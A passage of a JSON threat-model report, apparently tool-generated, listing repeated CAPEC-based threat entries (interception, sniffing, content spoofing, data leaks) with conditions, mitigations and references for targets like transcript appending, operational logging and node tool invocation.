"CR06"}, {"assumption": null, "condition": "not target.controls.isEncrypted or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Client-Server Protocol Manipulation", "details": "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.", "example": "An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.", "id": "380", "mitigations": "Use strong authentication protocols.", "references": "https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html", "response": "", "severity": "Medium", "target": "Read/write credentials", "threat_id": "CR08"}, {"assumption": null, "condition": "target.hasDataLeaks()", "cvss": "", "description": "Data Leak", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "An application, which connects to a database without TLS, performs a database query in which it compares the password to a stored hash, instead of fetching the hash and comparing it locally.", "id": "381", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "Very High", "target": "Read/write credentials", "threat_id": "DS06"}, {"assumption": null, "condition": "(target.hasDataLeaks() or any(d.isCredentials or d.isPII for d in target.data)) and (not target.controls.isEncrypted or (not target.isResponse and any(d.isStored and d.isDestEncryptedAtRest for d in target.data)) or (target.isResponse and any(d.isStored and d.isSourceEncryptedAtRest for d in target.data)))", "cvss": "", "description": "Unprotected Sensitive Data", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "", "id": "382", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "High", "target": "Read/write credentials", "threat_id": "DR01"}, {"assumption": null, "condition": "not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Interception", "details": "An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.", "example": "Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.", "id": "383", "mitigations": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.", "references": "https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Update session metadata", "threat_id": "DE01"}, {"assumption": null, "condition": "((not target.source.controls.providesIntegrity or not target.sink.controls.providesIntegrity) and not target.controls.isEncrypted) or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation))", "cvss": "", "description": "Content Spoofing", "details": "An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.", "example": "An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server.", "id": "384", "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.", "references": "https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Update session metadata", "threat_id": "AC05"}, {"assumption": null, "condition": "(target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False", "cvss": "", "description": "Sniffing Attacks", "details": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.", "example": "Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.", "id": "385", "mitigations": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception.", "references": "https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html", "response": "", "severity": "Medium", "target": "Update session metadata", "threat_id": "DE03"}, {"assumption": null, "condition": "(target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Communication Channel Manipulation", "details": "An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.", "example": "Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.", "id": "386", "mitigations": "Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.", "references": "https://capec.mitre.org/data/definitions/216.html", "response": "", "severity": "High", "target": "Update session metadata", "threat_id": "CR06"}, {"assumption": null, "condition": "not target.controls.isEncrypted or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Client-Server Protocol Manipulation", "details": "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.", "example": "An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.", "id": "387", "mitigations": "Use strong authentication protocols.", "references": "https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html", "response": "", "severity": "Medium", "target": "Update session metadata", "threat_id": "CR08"}, {"assumption": null, "condition": "target.hasDataLeaks()", "cvss": "", "description": "Data Leak", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "An application, which connects to a database without TLS, performs a database query in which it compares the password to a stored hash, instead of fetching the hash and comparing it locally.", "id": "388", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "Very High", "target": "Update session metadata", "threat_id": "DS06"}, {"assumption": null, "condition": "(target.hasDataLeaks() or any(d.isCredentials or d.isPII for d in target.data)) and (not target.controls.isEncrypted or (not target.isResponse and any(d.isStored and d.isDestEncryptedAtRest for d in target.data)) or (target.isResponse and any(d.isStored and d.isSourceEncryptedAtRest for d in target.data)))", "cvss": "", "description": "Unprotected Sensitive Data", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "", "id": "389", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "High", "target": "Update session metadata", "threat_id": "DR01"}, {"assumption": null, "condition": "not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Interception", "details": "An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.", "example": "Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.", "id": "390", "mitigations": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.", "references": "https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Append transcripts", "threat_id": "DE01"}, {"assumption": null, "condition": "((not target.source.controls.providesIntegrity or not target.sink.controls.providesIntegrity) and not target.controls.isEncrypted) or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation))", "cvss": "", "description": "Content Spoofing", "details": "An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.", "example": "An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server.", "id": "391", "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.", "references": "https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Append transcripts", "threat_id": "AC05"}, {"assumption": null, "condition": "(target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False", "cvss": "", "description": "Sniffing Attacks", "details": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.", "example": "Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.", "id": "392", "mitigations": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception.", "references": "https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html", "response": "", "severity": "Medium", "target": "Append transcripts", "threat_id": "DE03"}, {"assumption": null, "condition": "(target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Communication Channel Manipulation", "details": "An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.", "example": "Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.", "id": "393", "mitigations": "Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.", "references": "https://capec.mitre.org/data/definitions/216.html", "response": "", "severity": "High", "target": "Append transcripts", "threat_id": "CR06"}, {"assumption": null, "condition": "not target.controls.isEncrypted or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Client-Server Protocol Manipulation", "details": "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.", "example": "An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.", "id": "394", "mitigations": "Use strong authentication protocols.", "references": "https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html", "response": "", "severity": "Medium", "target": "Append transcripts", "threat_id": "CR08"}, {"assumption": null, "condition": "target.hasDataLeaks()", "cvss": "", "description": "Data Leak", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "An application, which connects to a database without TLS, performs a database query in which it compares the password to a stored hash, instead of fetching the hash and comparing it locally.", "id": "395", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "Very High", "target": "Append transcripts", "threat_id": "DS06"}, {"assumption": null, "condition": "(target.hasDataLeaks() or any(d.isCredentials or d.isPII for d in target.data)) and (not target.controls.isEncrypted or (not target.isResponse and any(d.isStored and d.isDestEncryptedAtRest for d in target.data)) or (target.isResponse and any(d.isStored and d.isSourceEncryptedAtRest for d in target.data)))", "cvss": "", "description": "Unprotected Sensitive Data", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "", "id": "396", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "High", "target": "Append transcripts", "threat_id": "DR01"}, {"assumption": null, "condition": "not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Interception", "details": "An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.", "example": "Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.", "id": "397", "mitigations": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.", "references": "https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Write operational logs", "threat_id": "DE01"}, {"assumption": null, "condition": "((not target.source.controls.providesIntegrity or not target.sink.controls.providesIntegrity) and not target.controls.isEncrypted) or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation))", "cvss": "", "description": "Content Spoofing", "details": "An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.", "example": "An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server.", "id": "398", "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.", "references": "https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Write operational logs", "threat_id": "AC05"}, {"assumption": null, "condition": "(target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False", "cvss": "", "description": "Sniffing Attacks", "details": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.", "example": "Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.", "id": "399", "mitigations": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception.", "references": "https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html", "response": "", "severity": "Medium", "target": "Write operational logs", "threat_id": "DE03"}, {"assumption": null, "condition": "(target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Communication Channel Manipulation", "details": "An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.", "example": "Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.", "id": "400", "mitigations": "Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.", "references": "https://capec.mitre.org/data/definitions/216.html", "response": "", "severity": "High", "target": "Write operational logs", "threat_id": "CR06"}, {"assumption": null, "condition": "not target.controls.isEncrypted or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Client-Server Protocol Manipulation", "details": "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.", "example": "An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.", "id": "401", "mitigations": "Use strong authentication protocols.", "references": "https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html", "response": "", "severity": "Medium", "target": "Write operational logs", "threat_id": "CR08"}, {"assumption": null, "condition": "target.hasDataLeaks()", "cvss": "", "description": "Data Leak", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "An application, which connects to a database without TLS, performs a database query in which it compares the password to a stored hash, instead of fetching the hash and comparing it locally.", "id": "402", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "Very High", "target": "Write operational logs", "threat_id": "DS06"}, {"assumption": null, "condition": "(target.hasDataLeaks() or any(d.isCredentials or d.isPII for d in target.data)) and (not target.controls.isEncrypted or (not target.isResponse and any(d.isStored and d.isDestEncryptedAtRest for d in target.data)) or (target.isResponse and any(d.isStored and d.isSourceEncryptedAtRest for d in target.data)))", "cvss": "", "description": "Unprotected Sensitive Data", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "", "id": "403", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "High", "target": "Write operational logs", "threat_id": "DR01"}, {"assumption": null, "condition": "not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Interception", "details": "An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.", "example": "Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.", "id": "404", "mitigations": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.", "references": "https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Invoke node tools", "threat_id": "DE01"}, {"assumption": null, "condition": "((not target.source.controls.providesIntegrity or not target.sink.controls.providesIntegrity) and not target.controls.isEncrypted) or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation))", "cvss": "", "description": "Content Spoofing", "details": "An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.", "example": "An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server.", "id": "405", "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.", "references": "https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Invoke node tools", "threat_id": "AC05"}, {"assumption": null, "condition": "(target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False", "cvss": "", "description": "Sniffing Attacks", "details": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.", "example": "Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.", "id": "406", "mitigations": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception.", "references": "https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html", "response": "", "severity": "Medium", "target": "Invoke node tools", "threat_id": "DE03"}, {"assumption": null, "condition": "(target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Communication Channel Manipulation", "details": "An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.", "example": "Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.", "id": "407", "mitigations": "Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.", "references": "https://capec.mitre.org/data/definitions/216.html", "response": "", "severity": "High", "target": "Invoke node tools", "threat_id": "CR06"}, {"assumption": null, "condition": "not target.controls.isEncrypted or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Client-Server Protocol Manipulation", "details": "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and 